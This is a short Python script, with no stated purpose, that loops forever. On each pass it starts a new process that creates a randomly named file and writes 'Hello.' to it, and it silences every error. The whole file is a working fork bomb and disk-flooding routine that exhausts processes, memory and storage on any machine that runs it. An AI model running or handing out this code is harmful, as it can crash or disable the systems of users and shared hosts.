# -*- encoding: utf-8 -*-
from uuid import uuid4
from multiprocessing import Process


def main():
    try:
        with open(file=f"{uuid4()}", mode="a", encoding="utf-8") as f:
            f.write("Hello.")
    except:
        pass

    return


if __name__ == "__main__":
    while True:
        try:
            Process(
                target=main
            ).start()
        except:
            pass
